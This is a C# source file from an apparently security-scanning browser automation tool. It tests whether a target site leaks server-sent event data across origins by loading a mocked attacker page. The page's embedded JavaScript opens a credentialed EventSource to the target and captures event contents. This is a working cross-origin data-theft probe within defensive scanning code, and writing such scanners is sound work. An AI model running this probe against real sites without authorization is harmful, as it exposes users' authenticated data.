using System.Text.Json;
using Trowser.Automation;
using Trowser.Security.XsLeaks;

namespace Trowser.Security.Sse;

/// <summary>Cross-origin EventSource proof from a mocked attacker page.</summary>
public static class SseCrossOriginProver
{
    public sealed class ProofResult
    {
        public string TargetUrl { get; init; } = "";
        public string AttackerOrigin { get; init; } = "";
        public bool ReceivedEventData { get; init; }
        public bool Vulnerable { get; init; }
        public string Severity { get; init; } = "info";
        public string Detail { get; init; } = "";
        public List<string> EventSamples { get; init; } = [];
        public int ElapsedMs { get; init; }
    }

    public sealed class ProofOptions
    {
        public string TargetUrl { get; init; } = "";
        public string AttackerOrigin { get; init; } = PostMessageProbeBuilder.AttackerOrigin;
        public int MonitorMs { get; init; } = 5000;
    }

    public static async Task<ProofResult> TestAsync(AutomationContext ctx, ProofOptions options, CancellationToken ct = default)
    {
        var sw = System.Diagnostics.Stopwatch.StartNew();
        var runId = Guid.NewGuid().ToString("N")[..10];
        var attackerOrigin = string.IsNullOrWhiteSpace(options.AttackerOrigin)
            ? PostMessageProbeBuilder.AttackerOrigin
            : options.AttackerOrigin.TrimEnd('/');

        await SecurityScanHygiene.PrepareActiveScanAsync(ctx);
        var tabScope = SecurityScanTabScope.Begin(ctx);
        var homeIdx = tabScope.HomeTabIndex;
        var victimHost = Uri.TryCreate(options.TargetUrl, UriKind.Absolute, out var u) ? u.Host : "";

        try
        {
            var probeIdx = await ctx.NewTab($"{attackerOrigin}/sse-cors/{runId}", owner: "agent");
            if (homeIdx >= 0 && probeIdx >= 0 && homeIdx < ctx.Tabs.Count && probeIdx < ctx.Tabs.Count)
                ctx.Tabs[probeIdx].CopyNetworkRulesFrom(ctx.Tabs[homeIdx]);

            var pageUrl = $"{attackerOrigin}/sse-cors/{runId}";
            var html = BuildAttackerHtml(options);
            ctx.Tabs[probeIdx].MockResponse(pageUrl, 200, html,
                headers: new Dictionary<string, string> { ["Content-Type"] = "text/html; charset=utf-8" });

            ctx.SwitchTab(probeIdx);
            await ctx.ForceNavigateAsync(pageUrl, terminateScripts: true);
            await ctx.WaitForIdle(400, 12_000);

            string? pageJson = null;
            var waitMs = Math.Clamp(options.MonitorMs + 2500, 4000, 20_000);
            for (var i = 0; i < waitMs / 100; i++)
            {
                ct.ThrowIfCancellationRequested();
                var title = await ctx.GetTitle();
                if (title != null && title.StartsWith("SSEX:", StringComparison.Ordinal))
                {
                    pageJson = title["SSEX:".Length..];
                    break;
                }

                await Task.Delay(100);
            }

            var samples = new List<string>();
            var gotData = false;
            if (pageJson != null)
            {
                try
                {
                    using var doc = JsonDocument.Parse(pageJson);
                    var root = doc.RootElement;
                    gotData = root.TryGetProperty("gotData", out var g) && g.ValueKind == JsonValueKind.True;
                    if (root.TryGetProperty("events", out var arr) && arr.ValueKind == JsonValueKind.Array)
                    {
                        foreach (var el in arr.EnumerateArray())
                        {
                            if (el.GetString() is { } s)
                                samples.Add(s.Length > 500 ? s[..500] + "..." : s);
                        }
                    }
                }
                catch { /* ignore */ }
            }

            sw.Stop();
            var vulnerable = gotData;
            return new ProofResult
            {
                TargetUrl = options.TargetUrl,
                AttackerOrigin = attackerOrigin,
                ReceivedEventData = gotData,
                Vulnerable = vulnerable,
                Severity = gotData ? "high" : "info",
                Detail = gotData
                    ? $"Cross-origin EventSource from {attackerOrigin} received event data from {options.TargetUrl}."
                    : "Cross-origin EventSource did not deliver event data (CORS or browser policy may block).",
                EventSamples = samples,
                ElapsedMs = (int)sw.ElapsedMilliseconds
            };
        }
        finally
        {
            ctx.SwitchTab(homeIdx);
            await tabScope.FinishAsync(victimHost, runId);
        }
    }

    private static string BuildAttackerHtml(ProofOptions options)
    {
        var url = JsonSerializer.Serialize(options.TargetUrl);
        var monitor = options.MonitorMs;
        return $$"""
<!DOCTYPE html><html><head><meta charset="utf-8"><title>SSE cross-origin</title></head><body>
<script>
(function(){
  var result = { attempted: true, gotData: false, events: [], error: null };
  function finish() { document.title = 'SSEX:' + JSON.stringify(result); }
  try {
    var es = new EventSource({{url}}, { withCredentials: true });
    es.onmessage = function(e) {
      result.gotData = true;
      result.events.push((e.data||'').slice(0, 400));
      if (result.events.length >= 5) { es.close(); finish(); }
    };
    es.onerror = function() { finish(); };
    setTimeout(function(){ try { es.close(); } catch(x){} finish(); }, {{monitor}});
  } catch (err) {
    result.error = String(err);
    finish();
  }
})();
</script></body></html>
""";
    }
}
